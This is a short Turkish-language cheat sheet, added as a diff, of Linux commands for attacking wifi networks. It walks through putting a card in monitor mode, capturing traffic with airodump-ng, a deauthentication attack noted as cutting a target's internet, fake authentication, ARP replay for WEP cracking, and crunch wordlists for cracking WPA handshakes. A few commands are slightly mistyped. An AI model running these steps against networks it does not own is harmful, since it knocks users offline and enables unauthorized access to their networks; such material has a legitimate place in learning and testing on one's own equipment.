@@ -1,0 +1,54 @@
+setxkbmap tr(klavyeyi tr yapar)
+apt-get update	(güncellemeleri alır)
+apt-get upgrade (güncellemeleri alır)
+apt-get install python-setuptools
+ifconfig (yerel ip yi yazar 10.)
+ping google.com(google'ın domain serverına ister yollar)
+unzip VPN.zip (çıkartır)
+openvpn VPN(vpn'e bağlanır)
+service network-manager restart (ağ bağlantılarını baştan başlatır)
+
+Monitor Moduna Geçme
+1)airmon-ng start wlan0(baştan başlatır monitor moda geçer)
+
+2)wlan0(bağlanılan wifi kartı)
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+iwconfig wlan0(wlan0 monitor mod oldu)
+
+3)ifconfig wlan0 down
+iwconfig wlan0 mode managed
+ifconfig wlan0 up
+ifconfig wlan0(wlan0 monitor moddan çıktı managed oldu)
+
+airodump-ng wlan0mon (etraftaki tüm modemleri bilgileriyle bulur)
+airodump-ng --channel 9 --bssid <BSSID> --write test1 wlan0mon
+(tek bir BSSID'ye odaklanarak işlem yapar)
+(Bundan sonra yeni terminal aç diğerini kapatma)
+
+Deauth Saldırısı(Frame'e göre)
+aireplay-ng --deauth 10000 -a <Kendi BSSID> -c <Station> 
+(Station=Karşıdakinin BSSID'sine Saldırı başlatır internetini keser)
+
+WEP Şifresi Kırma
+aircrack-ng test1-01.cap
+
+Sahte Yetkilendirme
+aireplay-ng --fakeauth 0 -a <BSSID> -h <Kendi MAC Adresim> wlan0mon
+Mac Adresi Bulmak için (ip addr)
+
+Paket Yükleme
+aireplay-ng --arpreplay -b <BSSID> -h <Kendi MAC Adresim> wlan0mon
+Daha sonra aircrack-ng --arpreplay-01.cap çalıştırılır(WEP Şifresi kırma)
+
+
+WPA Şifresi Kırma(Daha Zor)
+Deauth Saldırısına kadar aynı
+
+Crunch(Wordlist oluşturmak)
+Crunch <min>(8) <max>(9) xy123 -0 testwordlist(dosya)
+
+aircrack-ng handshake-file-01.cap -w testwordlist(WPA şifresini kırar)
+
+
